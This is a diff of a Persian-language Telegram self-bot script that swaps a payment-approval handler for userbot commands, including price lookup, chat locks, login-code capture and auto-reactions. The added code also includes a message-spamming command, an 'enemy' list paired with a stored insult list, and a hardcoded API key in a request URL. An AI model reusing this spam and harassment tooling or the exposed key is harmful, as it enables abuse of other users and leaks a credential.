+@app.on_message(filters.me & filters.command("قیمت", prefixes=""))
+async def price_command(client: Client, message: Message):
+    try:
+        if len(message.command) < 2:
+            await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton` یا `قیمت بیت‌کوین`")
             return
         
-        payment_data["proof_photo_id"] = message.photo.file_id
-        payment_data["proof_sent_at"] = time.time()
-        db.set("payments", user_id, payment_data)
+        coin_input = ' '.join(message.command[1:]).strip()
+        loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
+                if response.status == 200:
+                    data = await response.json()                    
+                    if data.get("ok"):
+                        prices = data["result"]
+                        found_coin = None
+                        coin_key = None
+                        if coin_input.upper() in prices:
+                            found_coin = prices[coin_input.upper()]
+                            coin_key = coin_input.upper()
+                        else:
+                            for key, coin_data in prices.items():
+                                if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower():
+                                    found_coin = coin_data
+                                    coin_key = key
+                                    break                        
+                        if found_coin and coin_key:
+                            coin_data = found_coin
+                            price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
+💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
+💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
+📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`
+
+⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}
+"""
+                            await loading_msg.edit_text(price_text)
+                        else:
+                            await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**\n\n💡 **مثال‌ها:**\n`قیمت BTC` - `قیمت بیت‌کوین`\n`قیمت ETH` - `قیمت اتریوم`\n`قیمت TON` - `قیمت تون`")
+                    else:
+                        await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
+                else:
+                    await loading_msg.edit_text("❌ خطا در اتصال به سرور")
+                    
+    except Exception as e:
+        await message.edit_text(f"❌ خطا: {str(e)}")
+
+@app.on_message(filters.me & filters.command("اسپم", prefixes=""))
+async def spam_command(client: Client, message: Message):
+    if len(message.command) < 3:
+        return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`\n\nعدد = تعداد پیام\nمتن = پیام مورد نظر")
+    
+    try:
+        count = int(message.command[1])
+        if count > 50:
+            return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")
         
-        admin_text = (
-            f"💰 **درخواست افزایش موجودی جدید**\n\n"
-            f"👤 **کاربر:** {message.from_user.first_name or 'ناشناس'}\n"
-            f"🆔 **آیدی:** `{user_id}`\n"
-            f"📧 **یوزرنیم:** @{message.from_user.username or 'ندارد'}\n"
-            f"💎 **تعداد سکه:** {payment_data['coins']}\n"
-            f"💵 **مبلغ:** {payment_data['toman']:,.0f} تومان\n"
-            f"⏰ **زمان:** {time.ctime()}"
-        )
+        spam_text = ' '.join(message.command[2:])
         
-        keyboard = InlineKeyboardMarkup([
-            [
-                InlineKeyboardButton("✅ تایید پرداخت", callback_data=f"payment_approve_{user_id}"),
-                InlineKeyboardButton("❌ رد پرداخت", callback_data=f"payment_reject_{user_id}")
-            ]
-        ])
+        if not spam_text:
+            return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")
+        
+        loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")
+        
+        success_count = 0
+        for i in range(count):
+            try:
+                await client.send_message(
+                    message.chat.id,
+                    f"{spam_text}",
+                    reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None
+                )
+                success_count += 1
+                await asyncio.sleep(0.2)
+            except Exception as e:
+                print(f"خطا در ارسال پیام {i+1}: {e}")
+        
+        await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}{'...' if len(spam_text) > 50 else ''}")
+        
+    except ValueError:
+        await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**\nمثال: `اسپم 10 سلام`")
+    except Exception as e:
+        await message.edit_text(f"❌ **خطا در ارسال اسپم:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
+async def auto_reply_command(client: Client, message: Message):
+    if len(message.command) < 2:
+        return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
+    
+    sub_command = message.command[1]
+    
+    if sub_command == "افزودن":
+        if len(message.command) < 3:
+            return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
         
         try:
-            await message.forward(ADMIN_ID)
-            await bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)
+            parts = ' '.join(message.command[2:]).split('|', 1)
+            if len(parts) != 2:
+                return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
             
-            await message.reply_text(
-                "✅ **رسید پرداخت شما دریافت شد و برای تایید به ادمین ارسال شد**\n\n"
-                "⏳ لطفا منتظر تایید ادمین باشید\n"
-                "🔔 پس از تایید، سکه ها به حساب شما اضافه خواهد شد",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-            )
-            
-            db.delete("temp_data", f"waiting_payment_proof_{user_id}")
-            
+            trigger, reply = parts[0].strip(), parts[1].strip()
+            auto_replies[trigger] = reply
+            await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
         except Exception as e:
-            await message.reply_text("❌ خطا در ارسال به ادمین. لطفا بعدا تلاش کنید.")
-def main():
-    print("● ربات سلف ساز روشن شد ●")
-    print("✅ ADMIN PHOTO PANEL: ENABLED")
-    try: 
-        bot.run()
-    except KeyboardInterrupt: 
-        print("\n🛑 توقف ربات...")
-    except Exception as e: 
-        print(f"❌ خطا: {e}")
-    finally: 
-        stop_all_selfbots()
-        print("✅ ربات متوقف شد")
-
-
-# ===== مدیریت عکس شرط و دوز =====
-admin_photo_wait = set()
-
-def save_bet_doz_image(file_id):
-    db.data["bet_doz_image"] = file_id
-    return db.save_data()
-
-def delete_bet_doz_image():
-    db.data.pop("bet_doz_image", None)
-    return db.save_data()
-
-@bot.on_message(filters.photo & filters.user(ADMIN_ID))
-async def save_bet_photo(client, message: Message):
-    if message.from_user.id not in admin_photo_wait:
-        return
-    admin_photo_wait.discard(message.from_user.id)
-    ok = save_bet_doz_image(message.photo.file_id)
-    if ok:
-        await message.reply_text("✅ **عکس شرط و دوز با موفقیت ذخیره شد.**\nاز این به بعد عکس در شرط و بازی دوز استفاده می‌شود.")
+            await message.edit(f"❌ **خطا در افزودن پاسخ:**\n`{e}`")
+    
+    elif sub_command == "حذف":
+        if len(message.command) < 3:
+            return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**\nمثال: `پاسخ حذف سلام`")
+        
+        trigger = ' '.join(message.command[2:]).strip()
+        if trigger in auto_replies:
+            del auto_replies[trigger]
+            await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
+        else:
+            await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")
+    
+    elif sub_command == "لیست":
+        if not auto_replies:
+            await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
+        else:
+            replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
+            await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")
+    
     else:
-        await message.reply_text("❌ ذخیره عکس در دیتابیس ناموفق بود.")
+        await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
+
+@app.on_message(filters.me & filters.command("دشمن", prefixes=""))
+async def enemy_command(client: Client, message: Message):
+    if not message.reply_to_message:
+        return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")
+    
+    enemy_user = message.reply_to_message.from_user
+    enemy_id = enemy_user.id
+    
+    if is_enemy(enemy_id):
+        await message.edit(f"❌ **این کاربر از قبل دشمن است**\n\n👤 کاربر: {enemy_user.first_name}\n🆔 آیدی: `{enemy_id}`")
+    else:
+        enemies.add(enemy_id)
+        save_enemies(enemies)
+        await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")
+
+@app.on_message(filters.me & filters.command("فحش", prefixes=""))
+async def insult_command(client: Client, message: Message):
+    if len(message.command) < 2:
+        return await message.edit("""
+⚠️ **سیستم مدیریت فحش‌ها**
+
+📋 **دستورات موجود:**
+• `فحش افزودن [متن]` - افزودن فحش جدید
+• `فحش حذف [متن]` - حذف فحش
+• `لیست فحش` - مشاهده لیست فحش‌ها
+
+📝 **مثال:**
+`فحش افزودن تو احمقی`
+`فحش حذف تو احمقی`
+`لیست فحش`
+""")
+    
+    sub_command = message.command[1]
+    
+    if sub_command == "افزودن":
+        if len(message.command) < 3:
+            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش افزودن تو احمقی`")
+        
+        insult_text = ' '.join(message.command[2:]).strip()
+        insults_list = load_insults()
+        if insult_text not in insults_list:
+            insults_list.append(insult_text)
+            if save_insults(insults_list):
+                await message.edit(f"✅ **فحش افزوده شد**\n\n💢 متن: {insult_text}")
+            else:
+                await message.edit("❌ **خطا در ذخیره فحش**")
+        else:
+            await message.edit(f"❌ **این فحش از قبل وجود دارد**")
+    
+    elif sub_command == "حذف":
+        if len(message.command) < 3:
+            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش حذف تو احمقی`")
+        
+        insult_text = ' '.join(message.command[2:]).strip()
+        insults_list = load_insults()
+        if insult_text in insults_list:
+            insults_list.remove(insult_text)
+            if save_insults(insults_list):
+                await message.edit(f"✅ **فحش حذف شد**\n\n💢 متن: {insult_text}")
+            else:
+                await message.edit("❌ **خطا در حذف فحش**")
+        else:
+            await message.edit(f"❌ **این فحش یافت نشد**")
+    
+    else:
+        await message.edit("⚠️ **استفاده:**\n`فحش افزودن [متن]`\n`فحش حذف [متن]`\n`لیست فحش`")
+
+@app.on_message(filters.me & filters.command("حذف", prefixes=""))
+async def remove_enemy_command(client: Client, message: Message):
+    text = message.text.strip()
+    if text == "حذف دشمن":
+        if not message.reply_to_message:
+            return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")
+
+        user_id = message.reply_to_message.from_user.id
+
+        if user_id in enemies:
+            enemies.remove(user_id)
+            save_enemies(enemies)
+            return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
+        else:
+            return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")
+
+@app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
+async def enemy_list_command(client: Client, message: Message):
+    if not enemies:
+        return await message.edit("❌ **لیست دشمنان خالی است**")
+    
+    try:
+        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")
+        
+        enemies_list = []
+        
+        for enemy_id in list(enemies):
+            try:
+                user = await client.get_users(enemy_id)
+                first_name = user.first_name or ""
+                last_name = user.last_name or ""
+                username = f"@{user.username}" if user.username else "❌ ندارد"
+                full_name = f"{first_name} {last_name}".strip()
+                
+                enemies_list.append({
+                    'id': enemy_id,
+                    'name': full_name,
+                    'username': username
+                })
+                await asyncio.sleep(0.1)
+                
+            except Exception as e:
+                print(f"❌ خطا در دریافت اطلاعات کاربر {enemy_id}: {e}")
+                enemies_list.append({
+                    'id': enemy_id,
+                    'name': "❌ خطا در دریافت",
+                    'username': "❌ خطا در دریافت"
+                })
+        
+        if not enemies_list:
+            return await loading_msg.edit("❌ **هیچ دشمنی در لیست وجود ندارد**")
+        
+        list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"
+        
+        for i, enemy in enumerate(enemies_list, 1):
+            list_text += f"{i}. **نام:** {enemy['name']}\n"
+            list_text += f"   **آیدی:** `{enemy['id']}`\n"
+            list_text += f"   **یوزرنیم:** {enemy['username']}\n"
+            list_text += "   " + "─" * 30 + "\n"
+        
+        if len(list_text) > 4000:
+            parts = [list_text[i:i+4000] for i in range(0, len(list_text), 4000)]
+            for part in parts:
+                await client.send_message(message.chat.id, part)
+            await loading_msg.delete()
+        else:
+            await loading_msg.edit(list_text)
+            
+    except Exception as e:
+        await message.edit(f"❌ **خطا در دریافت لیست دشمنان:**\n`{e}`")
+
+@app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
+async def enemies_compact_command(client: Client, message: Message):
+    if not enemies:
+        return await message.edit("❌ **لیست دشمنان خالی است**")
+    
+    try:
+        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات...**")
+        
+        compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"
+        
+        for i, enemy_id in enumerate(list(enemies), 1):
+            try:
+                user = await client.get_users(enemy_id)
+                first_name = user.first_name or ""
+                last_name = user.last_name or ""
+                username = f"@{user.username}" if user.username else "بدون یوزرنیم"
+                full_name = f"{first_name} {last_name}".strip() or "بدون نام"
+                
+                compact_text += f"{i}. **{full_name}** - {username} - `{enemy_id}`\n"
+                
+            except Exception as e:
+                compact_text += f"{i}. ❌ خطا در دریافت - `{enemy_id}`\n"
+        
+        await loading_msg.edit(compact_text)
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا:**\n`{e}`")
+
+@app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
+async def clear_enemies_command(client: Client, message: Message):
+    if not enemies:
+        return await message.edit("❌ **لیست دشمنان از قبل خالی است**")
+    
+    enemy_count = len(enemies)
+    enemies.clear()
+    save_enemies(enemies)
+    
+    await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")
+@app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
+async def advanced_id_command(client: Client, message: Message):
+    try:
+        user = message.from_user
+        chat = message.chat
+        
+        premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
+        username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
+        profile_photos = await client.get_chat_photos_count(user.id)
+        
+        if message.reply_to_message:
+            replied_user = message.reply_to_message.from_user
+            replied_chat = message.chat
+            
+            common_chats = await client.get_common_chats(replied_user.id)
+            
+            user_info = f"""
+<b>• اطلاعات کاربر</b>
+
+<b>آیدی عددی:</b> <code>{replied_user.id}</code>
+<b>یوزرنیم:</b> <code>{username_id}</code>
+<b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
+<b>نام خانوادگی:</b> {replied_user.last_name or '<i>ندارد</i>'}
+<b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
+<b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}
+
+<b>• اطلاعات چت</b>
+<b>آیدی چت:</b> <code>{replied_chat.id}</code>
+<b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
+<b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}
+"""
+            
+            if common_chats:
+                user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n"
+                user_info += f"<blockquote>"
+                
+                for i, common_chat in enumerate(common_chats, 1):
+                    chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
+                    username = f"@{common_chat.username}" if common_chat.username else "بدون یوزرنیم"
+                    members = f"{common_chat.members_count} عضو" if hasattr(common_chat, 'members_count') and common_chat.members_count else "نامشخص"
+                    
+                    user_info += f"<b>{i}. {common_chat.title}</b>\n"
+                    user_info += f"<i>نوع:</i> {chat_type}\n"
+                    user_info += f"<i>یوزرنیم:</i> {username}\n"
+                    user_info += f"<i>اعضا:</i> {members}\n"
+                    user_info += f"<i>آیدی:</i> <code>{common_chat.id}</code>"
+                    
+                    if i < len(common_chats):
+                        user_info += f"\n\n"
+                
+                user_info += f"</blockquote>"
+            else:
+                user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"
+            
+            await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)
+            
+        else:
+            chat_info = f"""
+<b>• اطلاعات کاربر و چت</b>
+
+<b>اطلاعات شما</b>
+<b>آیدی عددی:</b> <code>{user.id}</code>
+<b>یوزرنیم:</b> <code>{username_id}</code>
+<b>نام:</b> {user.first_name or '<i>ندارد</i>'}
+<b>نام خانوادگی:</b> {user.last_name or '<i>ندارد</i>'}
+<b>پریمیوم:</b> {premium_status}
+<b>تعداد پروفایل:</b> {profile_photos}
+
+<b>اطلاعات چت فعلی</b>
+<b>آیدی چت:</b> <code>{chat.id}</code>
+<b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
+<b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}
+"""
+            await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)
+            
+    except Exception as e:
+        await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
+
+@app.on_message(filters.me & filters.command("دانلود", prefixes=""))
+async def download_from_link(client: Client, message: Message):
+    if len(message.command) < 2:
+        await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
+        return    
+    link = message.command[1]    
+    try:
+        pattern = r"https://t\.me/(.+)/(\d+)"
+        match = re.match(pattern, link)        
+        if not match:
+            await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
+            return        
+        username = match.group(1)
+        post_id = int(match.group(2))        
+        processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
+        post = await client.get_messages(username, post_id)        
+        if not post:
+            await processing_msg.edit_text("❌ **پست یافت نشد**")
+            return        
+        await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")        
+        try:
+            await post.copy("me")
+            await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")            
+        except Exception as copy_error:
+            await processing_msg.edit_text("🔄 **روش دوم: در حال ارسال محتوا...**")            
+            try:
+                if post.media:
+                    file_path = await post.download()
+                    if post.audio:
+                        await client.send_audio("me", file_path, caption=post.caption or "")
+                    elif post.video:
+                        await client.send_video("me", file_path, caption=post.caption or "")
+                    elif post.photo:
+                        await client.send_photo("me", file_path, caption=post.caption or "")
+                    elif post.document:
+                        await client.send_document("me", file_path, caption=post.caption or "")
+                    elif post.voice:
+                        await client.send_voice("me", file_path, caption=post.caption or "")
+                    elif post.sticker:
+                        await client.send_sticker("me", file_path)
+                    elif post.animation:
+                        await client.send_animation("me", file_path, caption=post.caption or "")
+                    elif post.video_note:
+                        await client.send_video_note("me", file_path)
+                    else:
+                        await client.send_document("me", file_path, caption=post.caption or "")                    
+                    os.remove(file_path)
+                if post.text:
+                    await client.send_message("me", post.text)                
+                await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")                
+            except Exception as download_error:
+                await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")            
+    except Exception as e:
+        await message.edit_text(f"❌ **خطا:** `{str(e)}`")
+@app.on_message(filters.me & filters.regex(r'^آنلاین (روشن|خاموش)$'))
+async def online_command(client, message):
+    global always_online_enabled
+    
+    action = message.matches[0].group(1)
+    
+    if action == "روشن":
+        always_online_enabled = True
+        await message.edit_text(
+            "✅ **حالت همیشه آنلاین فعال شد**\n\n"
+            "🌐 اکانت شما همیشه به عنوان آنلاین نمایش داده خواهد شد."
+        )
+        asyncio.create_task(keep_online(client))
+        
+    elif action == "خاموش":
+        always_online_enabled = False
+        await message.edit_text(
+            "❌ **حالت همیشه آنلاین غیرفعال شد**"
+        )
+
+@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
+async def lock_all_on_command(client, message):
+    lock_settings["همه"] = True
+    await message.edit("✅ **قفل همه فعال شد**\n\nتمامی پیام‌ها در پیوی حذف خواهند شد.")
+
+@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
+async def lock_all_off_command(client, message):
+    lock_settings["همه"] = False
+    await message.edit("✅ **قفل همه غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
+async def lock_media_on_command(client, message):
+    lock_settings["مدیا"] = True
+    await message.edit("✅ **قفل مدیا فعال شد**\n\nارسال عکس و ویدیو در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
+async def lock_media_off_command(client, message):
+    lock_settings["مدیا"] = False
+    await message.edit("✅ **قفل مدیا غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
+async def lock_sticker_on_command(client, message):
+    lock_settings["استیکر"] = True
+    await message.edit("✅ **قفل استیکر فعال شد**\n\nارسال استیکر و گیف در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
+async def lock_sticker_off_command(client, message):
+    lock_settings["استیکر"] = False
+    await message.edit("✅ **قفل استیکر غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
+async def lock_forward_on_command(client, message):
+    lock_settings["فوروارد"] = True
+    await message.edit("✅ **قفل فوروارد فعال شد**\n\nارسال پیام فورواردی در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
+async def lock_forward_off_command(client, message):
+    lock_settings["فوروارد"] = False
+    await message.edit("✅ **قفل فوروارد غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
+async def lock_voice_on_command(client, message):
+    lock_settings["ویس"] = True
+    await message.edit("✅ **قفل ویس فعال شد**\n\nارسال ویس در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
+async def lock_voice_off_command(client, message):
+    lock_settings["ویس"] = False
+    await message.edit("✅ **قفل ویس غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
+async def lock_text_on_command(client, message):
+    lock_settings["پیام"] = True
+    await message.edit("✅ **قفل پیام فعال شد**\n\nارسال پیام متنی در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
+async def lock_text_off_command(client, message):
+    lock_settings["پیام"] = False
+    await message.edit("✅ **قفل پیام غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
+async def lock_file_on_command(client, message):
+    lock_settings["فایل"] = True
+    await message.edit("✅ **قفل فایل فعال شد**\n\nارسال فایل در پیوی حذف خواهد شد.")
+
+@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
+async def lock_file_off_command(client, message):
+    lock_settings["فایل"] = False
+    await message.edit("✅ **قفل فایل غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
+async def lock_status_command(client, message):
+    status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"
+    
+    for lock_type, status in lock_settings.items():
+        emoji = "🔴" if status else "🟢"
+        persian_status = "قفل" if status else "آزاد"
+        status_text += f"{emoji} **{lock_type}**: {persian_status}\n"
+    
+    status_text += f"\n📊 **تعداد قفل‌های فعال:** {sum(lock_settings.values())} از {len(lock_settings)}"
+    
+    await message.edit(status_text)
+
+@app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
+async def reset_lock_command(client, message):
+    for key in lock_settings:
+        lock_settings[key] = False
+    
+    await message.edit("✅ **همه قفل‌ها ریست شدند**\n\nهمه دسترسی‌ها آزاد شدند.")
+
+@app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
+async def lock_help_command(client, message):
+    help_text = """
+🛡️✨ **مرکز کنترل قفل‌های پیوی**
+
+╭───────◆◇◆───────╮
+      🔒 کنترل حرفه‌ای حریم خصوصی
+╰───────◆◇◆───────╯
+
+📘 **شرح کوتاه:**  
+با این دستورات می‌تونی تمام پیام‌ها، مدیاها و تعاملات داخل پیوی رو مدیریت و محدود کنی.
+
+━━━━━━━━━━━━━━━━━━
+
+🌐 **بخش ۱ — قفل‌های کلی**
+• `همه روشن` ➜ فعال‌سازی کامل قفل‌ها  
+• `همه خاموش` ➜ آزادسازی کامل  
+
+━━━━━━━━━━━━━━━━━━
+
+🎨 **بخش ۲ — مدیا و استیکر**
+• `مدیا روشن` ➜ بستن عکس، ویدیو و مدیا  
+• `مدیا خاموش` ➜ آزادسازی مدیا  
+• `استیکر روشن` ➜ قفل استیکر و گیف  
+• `استیکر خاموش` ➜ آزادسازی استیکر  
+
+━━━━━━━━━━━━━━━━━━
+
+🔁 **بخش ۳ — فوروارد و متن**
+• `فوروارد روشن` ➜ جلوگیری از فوروارد  
+• `فوروارد خاموش` ➜ آزادسازی فوروارد  
+• `پیام روشن` ➜ قفل پیام‌های متنی  
+• `پیام خاموش` ➜ مجاز کردن متن‌ها  
+
+━━━━━━━━━━━━━━━━━━
+
+🎧 **بخش ۴ — صدا و فایل**
+• `ویس روشن` ➜ قفل ویس  
+• `ویس خاموش` ➜ آزادسازی ویس  
+• `فایل روشن` ➜ قفل فایل‌ها  
+• `فایل خاموش` ➜ آزادسازی فایل  
+
+━━━━━━━━━━━━━━━━━━
+
+📊 **بخش ۵ — مدیریت وضعیت**
+• `وضعیت قفل` ➜ نمایش وضعیت فعلی  
+• `ریست قفل` ➜ بازگردانی به حالت اولیه  
+
+━━━━━━━━━━━━━━━━━━
+
+💡 **نمونه استفاده:**  
+`همه روشن`  
+"""
+    await message.edit(help_text)
+
+@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
+async def enable_anti_login(client, message):
+    global anti_login_enabled
+    anti_login_enabled = True
+    await message.edit("""✅ **انتی لاگین فعال شد**
+
+🛡️ **قابلیت‌ها:**
+• شناسایی پیام‌های کد ورود از 777000
+• استخراج خودکار کدهای ورود  
+• ذخیره کدها در پیام‌های ذخیره شده
+• حذف پیام اصلی برای امنیت
+
+📱 **کدها در Saved Messages ذخیره می‌شوند**""")
+
+@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
+async def disable_anti_login(client, message):
+    global anti_login_enabled
+    anti_login_enabled = False
+    await message.edit("✅ **انتی لاگین غیرفعال شد**")
+
+@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
+async def check_anti_login(client, message):
+    status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"
+    
+    status_text = f"""🛡️ **وضعیت انتی لاگین:** {status}
+
+{"📱 **سیستم فعال است** - کدهای ورود ذخیره می‌شوند" if anti_login_enabled else "🔓 **سیستم غیرفعال است** - پیام‌ها دست‌نخورده باقی می‌مانند"}"""
+
+    await message.edit(status_text)
+
+@app.on_message(filters.me & filters.regex(r'^ریکت\s+(.+)$'))
+async def set_reaction_command(client, message):
+    if len(message.command) < 2:
+        await message.edit("""✨ **سیستم ریکشن خودکار**
+
+📌 **استفاده:**
+• `ریکت 😊` (ریپلای روی پیام کاربر)
+• `ریکت 😊 @username`
+
+📌 **دستورات دیگر:**
+• `حذف ریکت` (ریپلای یا یوزرنیم)
+• `لیست ریکت`
+• `پاکسازی ریکت`""")
+        return
+    
+    reaction_emoji = message.command[1]
+    
+    if message.reply_to_message and message.reply_to_message.from_user:
+        user_id = message.reply_to_message.from_user.id
+        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
+        auto_reactions[str(user_id)] = reaction_emoji
+        save_reactions()
+        await message.edit(f"""✅ **ریکشن ثبت شد**
+👤 **کاربر:** {user_name}
+🆔 **آیدی:** `{user_id}`
+🎭 **ریکشن:** {reaction_emoji}""")
+        return
+
+    if len(message.command) > 2:
+        username = message.command[2].lstrip('@')
+        try:
+            user = await client.get_users(username)
+            user_id = user.id
+            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "کاربر"
+            auto_reactions[str(user_id)] = reaction_emoji
+            save_reactions()
+            await message.edit(f"""✅ **ریکشن ثبت شد**
+👤 **کاربر:** {user_name}
+🆔 **آیدی:** `{user_id}`
+🎭 **ریکشن:** {reaction_emoji}""")
+        except:
+            await message.edit("❌ **کاربر یافت نشد**\nلطفاً یوزرنیم معتبر وارد کنید")
+        return
+    
+    await message.edit("❌ **روی پیام کاربر ریپلای کنید یا یوزرنیم وارد کنید**")
+
+@app.on_message(filters.me & filters.regex(r'^لیست ریکت$'))
+async def list_reactions_command(client, message):
+    if not auto_reactions:
+        await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
+        return
+    
+    list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"
+    for user_id, reaction in auto_reactions.items():
